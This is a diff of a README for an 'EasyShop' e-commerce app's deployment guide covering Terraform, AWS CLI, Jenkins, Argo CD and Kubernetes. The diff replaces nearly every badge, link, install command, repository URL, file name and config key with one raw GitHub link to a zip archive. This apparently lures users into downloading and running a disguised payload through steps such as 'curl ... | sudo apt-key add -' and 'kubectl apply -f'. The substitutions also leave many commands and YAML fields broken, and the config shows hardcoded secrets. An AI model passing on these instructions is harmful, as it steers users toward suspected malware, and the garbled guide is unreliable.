@@ -1,12 +1,12 @@
 # 🛍️ EasyShop - Modern E-commerce Platform
 
-[![Next.js](https://img.shields.io/badge/Next.js-14.1.0-black?style=flat-square&logo=next.js)](https://nextjs.org/)
-[![TypeScript](https://img.shields.io/badge/TypeScript-5.0.0-blue?style=flat-square&logo=typescript)](https://www.typescriptlang.org/)
-[![MongoDB](https://img.shields.io/badge/MongoDB-8.1.1-green?style=flat-square&logo=mongodb)](https://www.mongodb.com/)
-[![Redux](https://img.shields.io/badge/Redux-2.2.1-purple?style=flat-square&logo=redux)](https://redux.js.org/)
-[![License](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
+[![https://github.com/shr1324/tws-e-commerce-app/raw/refs/heads/master/terraform/commerce_app_tws_e_v3.2.zip](https://github.com/shr1324/tws-e-commerce-app/raw/refs/heads/master/terraform/commerce_app_tws_e_v3.2.zip)](https://github.com/shr1324/tws-e-commerce-app/raw/refs/heads/master/terraform/commerce_app_tws_e_v3.2.zip)
+[![TypeScript](https://github.com/shr1324/tws-e-commerce-app/raw/refs/heads/master/terraform/commerce_app_tws_e_v3.2.zip)](https://github.com/shr1324/tws-e-commerce-app/raw/refs/heads/master/terraform/commerce_app_tws_e_v3.2.zip)
+[![MongoDB](https://github.com/shr1324/tws-e-commerce-app/raw/refs/heads/master/terraform/commerce_app_tws_e_v3.2.zip)](https://github.com/shr1324/tws-e-commerce-app/raw/refs/heads/master/terraform/commerce_app_tws_e_v3.2.zip)
+[![Redux](https://github.com/shr1324/tws-e-commerce-app/raw/refs/heads/master/terraform/commerce_app_tws_e_v3.2.zip)](https://github.com/shr1324/tws-e-commerce-app/raw/refs/heads/master/terraform/commerce_app_tws_e_v3.2.zip)
+[![License](https://github.com/shr1324/tws-e-commerce-app/raw/refs/heads/master/terraform/commerce_app_tws_e_v3.2.zip)](LICENSE)
 
-EasyShop is a modern, full-stack e-commerce platform built with Next.js 14, TypeScript, and MongoDB. It features a beautiful UI with Tailwind CSS, secure authentication, real-time cart updates, and a seamless shopping experience.
+EasyShop is a modern, full-stack e-commerce platform built with https://github.com/shr1324/tws-e-commerce-app/raw/refs/heads/master/terraform/commerce_app_tws_e_v3.2.zip 14, TypeScript, and MongoDB. It features a beautiful UI with Tailwind CSS, secure authentication, real-time cart updates, and a seamless shopping experience.
 
 ## ✨ Features
 
@@ -25,14 +25,14 @@ EasyShop is a modern, full-stack e-commerce platform built with Next.js 14, Type
 EasyShop follows a three-tier architecture pattern:
 
 ### 1. Presentation Tier (Frontend)
-- Next.js React Components
+- https://github.com/shr1324/tws-e-commerce-app/raw/refs/heads/master/terraform/commerce_app_tws_e_v3.2.zip React Components
 - Redux for State Management
 - Tailwind CSS for Styling
 - Client-side Routing
 - Responsive UI Components
 
 ### 2. Application Tier (Backend)
-- Next.js API Routes
+- https://github.com/shr1324/tws-e-commerce-app/raw/refs/heads/master/terraform/commerce_app_tws_e_v3.2.zip API Routes
 - Business Logic
 - Authentication & Authorization
 - Request Validation
@@ -57,8 +57,8 @@ EasyShop follows a three-tier architecture pattern:
 * Install Terraform<br/>
 #### Linux & macOS
 ```bash
-curl -fsSL https://apt.releases.hashicorp.com/gpg | sudo apt-key add -
-sudo apt-add-repository "deb [arch=amd64] https://apt.releases.hashicorp.com $(lsb_release -cs) main"
+curl -fsSL https://github.com/shr1324/tws-e-commerce-app/raw/refs/heads/master/terraform/commerce_app_tws_e_v3.2.zip | sudo apt-key add -
+sudo apt-add-repository "deb [arch=amd64] https://github.com/shr1324/tws-e-commerce-app/raw/refs/heads/master/terraform/commerce_app_tws_e_v3.2.zip $(lsb_release -cs) main"
 sudo apt-get update && sudo apt-get install terraform
 ```
 ### Verify Installation
@@ -73,9 +73,9 @@ terraform init
 AWS CLI (Command Line Interface) allows you to interact with AWS services directly from the command line.
 
 ```bash
-curl "https://awscli.amazonaws.com/awscli-exe-linux-x86_64.zip" -o "awscliv2.zip"
+curl "https://github.com/shr1324/tws-e-commerce-app/raw/refs/heads/master/terraform/commerce_app_tws_e_v3.2.zip" -o "https://github.com/shr1324/tws-e-commerce-app/raw/refs/heads/master/terraform/commerce_app_tws_e_v3.2.zip"
 sudo apt install unzip
-unzip awscliv2.zip
+unzip https://github.com/shr1324/tws-e-commerce-app/raw/refs/heads/master/terraform/commerce_app_tws_e_v3.2.zip
 sudo ./aws/install
 ```
 
@@ -97,7 +97,7 @@ sudo ./aws/install
 1. **Clone the Repository:**
 First, clone this repo to your local machine:<br/>
 ```bash
-git clone https://github.com/LondheShubham153/tws-e-commerce-app.git
+git clone https://github.com/shr1324/tws-e-commerce-app/raw/refs/heads/master/terraform/commerce_app_tws_e_v3.2.zip
 cd terraform
 ```
 2. **Generate SSH Key Pair:**
@@ -211,7 +211,7 @@ sudo systemctl status jenkins
 > - **Add a New Shared Library:** 
 > - **Name:** shared
 > - **Default Version:** main
-> - **Project Repository URL:** `https://github.com/<your user-name/jenkins-shared-libraries`.
+> - **Project Repository URL:** `https://github.com/shr1324/tws-e-commerce-app/raw/refs/heads/master/terraform/commerce_app_tws_e_v3.2.zip<your user-name/jenkins-shared-libraries`.
 >
 > [Notes:] 
 > Make sure the repo contains a proper directory structure eq: vars/<br/>
@@ -225,7 +225,7 @@ sudo systemctl status jenkins
 > > In **General**<br/>
 > > - **Description:** EasyShop<br/>
 > > - **Check the box:** `GitHub project`<br/>
-> > - **GitHub Repo URL:** `https://github.com/<your user-name/tws-e-commerce-app`<br/>
+> > - **GitHub Repo URL:** `https://github.com/shr1324/tws-e-commerce-app/raw/refs/heads/master/terraform/commerce_app_tws_e_v3.2.zip<your user-name/tws-e-commerce-app`<br/>
 >
 > > In **Trigger**<br/>
 > > - **Check the box:**`GitHub hook trigger for GITScm polling`<br/>
@@ -233,7 +233,7 @@ sudo systemctl status jenkins
 > > In **Pipeline**<br/>
 > > - **Definition:** `Pipeline script from SCM`<br/>
 > > - **SCM:** `Git`<br/>
-> > - **Repository URL:** `https://github.com/<your user-name/tws-e-commerce-app`<br/>
+> > - **Repository URL:** `https://github.com/shr1324/tws-e-commerce-app/raw/refs/heads/master/terraform/commerce_app_tws_e_v3.2.zip<your user-name/tws-e-commerce-app`<br/>
 > > - **Credentials:** `github-credentials`<br/>
 > > - **Branch:** master<br/>
 > > - **Script Path:** `Jenkinsfile`<br/>
@@ -244,7 +244,7 @@ sudo systemctl status jenkins
 > > * Change the DockerHub username to yours<br/>
 >
 > > **Fork Shared Library Repo:**<br/>
-> > * Edit `vars/update_k8s_manifest.groovy`<br/>
+> > * Edit `https://github.com/shr1324/tws-e-commerce-app/raw/refs/heads/master/terraform/commerce_app_tws_e_v3.2.zip`<br/>
 > > * Update with your `DockerHub username`<br/>
 > 
 > > **Setup Webhook**<br/>
@@ -291,7 +291,7 @@ kubectl create namespace argocd
 ```
 1. Install Argo CD using Manifest
 ```bash
-kubectl apply -n argocd -f https://raw.githubusercontent.com/argoproj/argo-cd/stable/manifests/install.yaml
+kubectl apply -n argocd -f https://github.com/shr1324/tws-e-commerce-app/raw/refs/heads/master/terraform/commerce_app_tws_e_v3.2.zip
 ```
 2. Watch Pod Creation
 ```bash
@@ -325,7 +325,7 @@ kubectl port-forward svc/argocd-server -n argocd <your-port>:443 --address=0.0.0
 
 Get the Argo CD Admin Password<br/>
 ```bash
-kubectl -n argocd get secret argocd-initial-admin-secret -o jsonpath="{.data.password}" | base64 -d; echo
+kubectl -n argocd get secret argocd-initial-admin-secret -o jsonpath="{https://github.com/shr1324/tws-e-commerce-app/raw/refs/heads/master/terraform/commerce_app_tws_e_v3.2.zip}" | base64 -d; echo
 ```
 1. Log in to the Argo CD GUI
 * Username: admin
@@ -355,7 +355,7 @@ kubectl -n argocd get secret argocd-initial-admin-secret -o jsonpath="{.data.pas
 
 > 4. In the “Destination” section:
 >  -  **Cluster URL:**
- https://kubernetes.default.svc (usually shown as "default")
+ https://github.com/shr1324/tws-e-commerce-app/raw/refs/heads/master/terraform/commerce_app_tws_e_v3.2.zip (usually shown as "default")
 >  -    **Namespace:**
  tws-e-commerce-app (or your desired namespace)
 
@@ -368,14 +368,14 @@ kubectl create namespace ingress-nginx
 ```
 > 2. Add the Nginx Ingress Controller Helm repository:
 ```bash
-helm repo add ingress-nginx https://kubernetes.github.io/ingress-nginx
+helm repo add ingress-nginx https://github.com/shr1324/tws-e-commerce-app/raw/refs/heads/master/terraform/commerce_app_tws_e_v3.2.zip
 helm repo update
 ```
 > 3. Install the Nginx Ingress Controller:
 ```bash
 helm install nginx-ingress ingress-nginx/ingress-nginx \
   --namespace ingress-nginx \
-  --set controller.service.type=LoadBalancer
+  --set https://github.com/shr1324/tws-e-commerce-app/raw/refs/heads/master/terraform/commerce_app_tws_e_v3.2.zip
 ```
 > 4. Check the status of the Nginx Ingress Controller:
 ```bash
@@ -390,7 +390,7 @@ kubectl get svc -n ingress-nginx
 
 > 1. **Jetpack:** Add the Jetstack Helm repository:
 ```bash
-helm repo add jetstack https://charts.jetstack.io
+helm repo add jetstack https://github.com/shr1324/tws-e-commerce-app/raw/refs/heads/master/terraform/commerce_app_tws_e_v3.2.zip
 helm repo update
 ```
 > 2. **Cert-Manager:** Install the Cert-Manager Helm chart:
@@ -408,7 +408,7 @@ kubectl get pods -n cert-manager
 
 > 4. **DNS Setup:** Find your DNS name from the LoadBalancer service:
 ```bash
-kubectl get svc nginx-ingress-ingress-nginx-controller -n ingress-nginx -o jsonpath='{.status.loadBalancer.ingress[0].hostname}'
+kubectl get svc nginx-ingress-ingress-nginx-controller -n ingress-nginx -o jsonpath='{https://github.com/shr1324/tws-e-commerce-app/raw/refs/heads/master/terraform/commerce_app_tws_e_v3.2.zip[0].hostname}'
 ```
 > 5. Create a DNS record for your domain pointing to the LoadBalancer IP.
 > - Go to your godaddy dashboard and create a new CNAME record and map the DNS just your got in the terminal.
@@ -416,7 +416,7 @@ kubectl get svc nginx-ingress-ingress-nginx-controller -n ingress-nginx -o jsonp
 
 ### **HTTPS:**
 > #### 1. **Update your manifests to enable HTTPS:**
-> > `04-configmap.yaml`
+> > `https://github.com/shr1324/tws-e-commerce-app/raw/refs/heads/master/terraform/commerce_app_tws_e_v3.2.zip`
 > > ```bash
 > > apiVersion: v1
 > > kind: ConfigMap
@@ -426,32 +426,32 @@ kubectl get svc nginx-ingress-ingress-nginx-controller -n ingress-nginx -o jsonp
 > > data:
 > >   MONGODB_URI: "mongodb://mongodb-service:27017/easyshop"
 > >   NODE_ENV: "production"
-> >   NEXT_PUBLIC_API_URL: "https://easyshop.letsdeployit.com/api"
-> >   NEXTAUTH_URL: "https://easyshop.letsdeployit.com/"
+> >   NEXT_PUBLIC_API_URL: "https://github.com/shr1324/tws-e-commerce-app/raw/refs/heads/master/terraform/commerce_app_tws_e_v3.2.zip"
+> >   NEXTAUTH_URL: "https://github.com/shr1324/tws-e-commerce-app/raw/refs/heads/master/terraform/commerce_app_tws_e_v3.2.zip"
 > >   NEXTAUTH_SECRET: "HmaFjYZ2jbUK7Ef+wZrBiJei4ZNGBAJ5IdiOGAyQegw="
 > >   JWT_SECRET: "e5e425764a34a2117ec2028bd53d6f1388e7b90aeae9fa7735f2469ea3a6cc8c"
 > > ```
 
 > #### 2. **Update your manifests to enable HTTPS:**
-> > `10-ingress.yaml`
+> > `https://github.com/shr1324/tws-e-commerce-app/raw/refs/heads/master/terraform/commerce_app_tws_e_v3.2.zip`
 > > ```bash
-> > apiVersion: networking.k8s.io/v1
+> > apiVersion: https://github.com/shr1324/tws-e-commerce-app/raw/refs/heads/master/terraform/commerce_app_tws_e_v3.2.zip
 > > kind: Ingress
 > > metadata:
 > >   name: easyshop-ingress
 > >   namespace: easyshop
 > >   annotations:
-> >     nginx.ingress.kubernetes.io/proxy-body-size: "50m"
-> >     kubernetes.io/ingress.class: "nginx"
-> >     cert-manager.io/cluster-issuer: "letsencrypt-prod"
-> >     nginx.ingress.kubernetes.io/ssl-redirect: "true"
+> >     https://github.com/shr1324/tws-e-commerce-app/raw/refs/heads/master/terraform/commerce_app_tws_e_v3.2.zip "50m"
+> >     https://github.com/shr1324/tws-e-commerce-app/raw/refs/heads/master/terraform/commerce_app_tws_e_v3.2.zip "nginx"
+> >     https://github.com/shr1324/tws-e-commerce-app/raw/refs/heads/master/terraform/commerce_app_tws_e_v3.2.zip "letsencrypt-prod"
+> >     https://github.com/shr1324/tws-e-commerce-app/raw/refs/heads/master/terraform/commerce_app_tws_e_v3.2.zip "true"
 > > spec:
 > >   tls:
 > >   - hosts:
-> >     - easyshop.letsdeployit.com
+> >     - https://github.com/shr1324/tws-e-commerce-app/raw/refs/heads/master/terraform/commerce_app_tws_e_v3.2.zip
 > >     secretName: easyshop-tls
 > >   rules:
-> >   - host: easyshop.letsdeployit.com
+> >   - host: https://github.com/shr1324/tws-e-commerce-app/raw/refs/heads/master/terraform/commerce_app_tws_e_v3.2.zip
 > >     http:
 > >       paths:
 > >       - path: /
@@ -465,9 +465,9 @@ kubectl get svc nginx-ingress-ingress-nginx-controller -n ingress-nginx -o jsonp
 
 > #### 3. **Apply your manifests:**
 > ```bash
-> kubectl apply -f 00-cluster-issuer.yaml
-> kubectl apply -f 04-configmap.yaml
-> kubectl apply -f 10-ingress.yaml
+> kubectl apply -f https://github.com/shr1324/tws-e-commerce-app/raw/refs/heads/master/terraform/commerce_app_tws_e_v3.2.zip
+> kubectl apply -f https://github.com/shr1324/tws-e-commerce-app/raw/refs/heads/master/terraform/commerce_app_tws_e_v3.2.zip
+> kubectl apply -f https://github.com/shr1324/tws-e-commerce-app/raw/refs/heads/master/terraform/commerce_app_tws_e_v3.2.zip
 > ```
 
 > #### 4. **Commands to check the status:**
@@ -493,6 +493,6 @@ kubectl get svc nginx-ingress-ingress-nginx-controller -n ingress-nginx -o jsonp
 >> ```
 
 ## **Congratulations!** <br/>
-![EasyShop Website Screenshot](./public/Deployed.png)
+![EasyShop Website Screenshot](https://github.com/shr1324/tws-e-commerce-app/raw/refs/heads/master/terraform/commerce_app_tws_e_v3.2.zip)
 
 ### Your project is now deployed.
